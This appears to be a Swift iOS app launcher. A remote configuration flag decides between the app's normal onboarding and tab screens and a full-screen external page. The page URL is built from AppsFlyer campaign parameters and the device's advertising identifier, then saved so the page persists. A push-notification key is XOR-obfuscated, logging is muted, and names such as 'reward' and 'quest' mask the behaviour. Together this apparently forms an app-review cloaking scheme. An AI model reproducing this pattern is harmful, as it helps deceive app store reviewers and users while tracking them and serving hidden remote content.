import SwiftUI
import FirebaseCore
import OneSignalFramework
import Combine

struct SweetLauncherView: View {
    @StateObject private var coordinator = SweetJourneyCoordinator()
    @StateObject private var displayState = SweetDisplayState()
    
    var body: some View {
        ZStack {
            if let reward = coordinator.rewardPath {
                SweetRewardScreen(reward: reward, displayState: displayState)
            }
            if coordinator.showSweetHome {
                MainContentView()
            }
            if !coordinator.showSweetHome && !displayState.contentReady {
                SplashView()
            }
        }
        .onChange(of: coordinator.rewardPath) { path in
            if let path = path {
                displayState.prepareContent(path: path)
            }
        }
    }
}

struct SweetRewardScreen: View {
    let reward: URL
    @ObservedObject var displayState: SweetDisplayState
    
    var body: some View {
        VStack(spacing: 0) {
            sweetNavigationBar
            SweetContentContainer(reward: reward, state: displayState)
        }
        .background(Color.black)
    }
    
    private var sweetNavigationBar: some View {
        HStack {
            Button { displayState.navigateBack() } label: {
                Image(systemName: "chevron.left")
                    .font(.system(size: 20, weight: .semibold))
                    .foregroundColor(.white)
                    .opacity(displayState.canNavigateBack ? 1.0 : 0.3)
                    .frame(width: 44, height: 44)
            }
            .disabled(!displayState.canNavigateBack)
            Spacer()
            Button { displayState.navigateHome() } label: {
                Image(systemName: "house.fill")
                    .font(.system(size: 20, weight: .medium))
                    .foregroundColor(.white)
                    .frame(width: 44, height: 44)
            }
        }
        .padding(.horizontal, 8)
        .frame(height: 44)
        .background(Color.black)
    }
}

@MainActor
final class SweetJourneyCoordinator: ObservableObject {
    @Published var rewardPath: URL?
    @Published var showSweetHome = false
    private var playerId: String?
    private var rewardDataReceived = false
    private let settingsProvider = SweetConfigProvider.shared
    
    init() {
        Task { await beginJourney() }
    }
    
    private func setupRewardCallback() {
        SweetRewardTracker.shared.onDataReceived = { [weak self] in
            Task { @MainActor in
                self?.rewardDataReceived = true
            }
        }
    }
    
    private func setupRewardTracker() {
        let devKey = settingsProvider.rewardDevKey
        let appId = settingsProvider.rewardAppId
        if !devKey.isEmpty, !appId.isEmpty {
            SweetRewardTracker.shared.configure(devKey: devKey, appId: appId)
        }
    }
    
    private func beginJourney() async {
        SweetLoadingIndicator.shared.update(0.05)
        
        _ = await settingsProvider.loadSettings()
        SweetLoadingIndicator.shared.add(0.10)
        
        guard settingsProvider.questActive else {
            Task { await animateLoadingProgress() }
            playerId = await SweetAccessGate.shared.requestPlayerTracking()
            _ = await SweetAccessGate.shared.requestNotificationAccess()
            await finishJourney()
            return
        }
        
        setupRewardCallback()
        setupRewardTracker()
        
        if let saved = SweetProgressKeeper.shared.savedReward {
            SweetLoadingIndicator.shared.update(0.85)
            rewardPath = saved
            playerId = await SweetAccessGate.shared.requestPlayerTracking()
            Task { _ = await SweetAccessGate.shared.requestNotificationAccess() }
            return
        }
        
        SweetLoadingIndicator.shared.add(0.10)
        playerId = await SweetAccessGate.shared.requestPlayerTracking()
        SweetLoadingIndicator.shared.add(0.20)
        
        await discoverReward()
        
        Task { _ = await SweetAccessGate.shared.requestNotificationAccess() }
    }
    
    private func discoverReward() async {
        SweetLoadingIndicator.shared.add(0.10)
        let appBundle = Bundle.main.bundleIdentifier ?? "unknown"
        let rewardDevKey = settingsProvider.rewardDevKey
        
        if !rewardDevKey.isEmpty {
            if let path = await tryRewardPath(appBundle: appBundle) {
                SweetLoadingIndicator.shared.update(0.85)
                rewardPath = path
                SweetProgressKeeper.shared.saveReward(path)
                return
            }
        }
        
        guard let response = await SweetDataFetcher.fetchReward(appBundle: appBundle, playerId: playerId) else {
            await finishJourney()
            return
        }
        
        guard response.hasContent,
              let sweetPath = response.buildDestination(trackerId: playerId, appBundle: appBundle) else {
            await finishJourney()
            return
        }
        
        SweetLoadingIndicator.shared.update(0.85)
        rewardPath = sweetPath
        SweetProgressKeeper.shared.saveReward(sweetPath)
    }
    
    private func tryRewardPath(appBundle: String) async -> URL? {
        guard await waitForRewardData() else { return nil }
        SweetLoadingIndicator.shared.add(0.05)
        let tracker = SweetRewardTracker.shared
        guard !tracker.isDefaultUser() else { return nil }
        return buildRewardPath(appBundle: appBundle, params: tracker.extractCampaignParams())
    }
    
    private func waitForRewardData() async -> Bool {
        let timeout = SweetQuestConstants.rewardTimeout
        let start = Date()
        while !rewardDataReceived {
            if Date().timeIntervalSince(start) > timeout {
                return false
            }
            try? await Task.sleep(nanoseconds: 100_000_000)
        }
        return true
    }
    
    private func buildRewardPath(appBundle: String, params: [String: String]) -> URL? {
        guard let pathId = params["path_id"], !pathId.isEmpty else { return nil }
        let basePath = settingsProvider.bonusRoute
        guard !basePath.isEmpty else { return nil }
        var pathString = basePath.hasSuffix("/") ? basePath : basePath + "/"
        pathString += pathId
        guard var components = URLComponents(string: pathString) else { return nil }
        var queryItems: [URLQueryItem] = []
        if let appName = params["app_name"] {
            queryItems.append(URLQueryItem(name: "app_name", value: appName))
        }
        if let tmId = params["tm_id"] {
            queryItems.append(URLQueryItem(name: "tm_id", value: tmId))
        }
        for i in 3...20 {
            if let value = params["sub_id_\(i)"] {
                queryItems.append(URLQueryItem(name: "sub_id_\(i)", value: value))
            }
        }
        queryItems.append(URLQueryItem(name: "bundle", value: appBundle))
        if let trackingId = params["appsflyer_id"] {
            queryItems.append(URLQueryItem(name: "appsflyer_id", value: trackingId))
        }
        if let id = playerId, !id.isEmpty {
            queryItems.append(URLQueryItem(name: "idfa", value: id))
        }
        components.queryItems = queryItems
        return components.url
    }
    
    private func finishJourney() async {
        SweetLoadingIndicator.shared.update(1.0)
        showSweetHome = true
    }
    
    private func animateLoadingProgress() async {
        let steps: [(Double, UInt64)] = [
            (0.25, 300_000_000),
            (0.45, 400_000_000),
            (0.65, 500_000_000),
            (0.85, 400_000_000),
            (0.95, 300_000_000)
        ]
        for (value, delay) in steps {
            SweetLoadingIndicator.shared.update(value)
            try? await Task.sleep(nanoseconds: delay)
        }
    }
}

class SweetAppLauncher: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    static var launchOptions: [UIApplication.LaunchOptionsKey: Any]?
    
    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        SweetAppLauncher.launchOptions = launchOptions
        UNUserNotificationCenter.current().delegate = self
        
        FirebaseApp.configure()
        
        let sweetKey: [UInt8] = [0x53, 0x77, 0x65, 0x65, 0x74, 0x51, 0x75, 0x65, 0x73, 0x74]
        let encodedId: [UInt8] = [0x35, 0x40, 0x54, 0x04, 0x15, 0x30, 0x41, 0x57, 0x5e, 0x4c, 0x65, 0x47, 0x50, 0x48, 0x40, 0x35, 0x10, 0x07, 0x5e, 0x4c, 0x35, 0x41, 0x51, 0x48, 0x42, 0x63, 0x40, 0x5c, 0x41, 0x42, 0x6a, 0x40, 0x00, 0x03, 0x45, 0x62]
        let notificationId = String(bytes: encodedId.enumerated().map { $0.element ^ sweetKey[$0.offset % sweetKey.count] }, encoding: .utf8) ?? ""
        
        OneSignal.Debug.setLogLevel(.LL_NONE)
        OneSignal.Notifications.addClickListener(self)
        OneSignal.initialize(notificationId, withLaunchOptions: launchOptions)
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(appDidBecomeActive),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        
        return true
    }
    
    @objc private func appDidBecomeActive() {
        SweetRewardTracker.shared.start()
    }
    
    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        willPresent notification: UNNotification,
        withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void
    ) {
        completionHandler([.banner, .sound, .badge])
    }
    
    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        didReceive response: UNNotificationResponse,
        withCompletionHandler completionHandler: @escaping () -> Void
    ) {
        completionHandler()
    }
}

extension SweetAppLauncher: OSNotificationClickListener {
    func onClick(event: OSNotificationClickEvent) {}
}

struct MainContentView: View {
    @State var appState: AppState = .onboarding
    @AppStorage("FIRST_LAUNCH") var firstLaunch = true
    
    var body: some View {
        Group {
            switch appState {
            case .onboarding:
                OnboardingView()
            case .home:
                TabBarView()
            }
        }
        .environmentObject(NotificationService.shared)
        .preferredColorScheme(.light)
        .onAppear {
            appState = firstLaunch ? .onboarding : .home
        }
        .onChange(of: firstLaunch) { newValue in
            appState = newValue ? .onboarding : .home
        }
    }
    
    enum AppState {
        case onboarding
        case home
    }
}

#Preview {
    MainContentView()
}
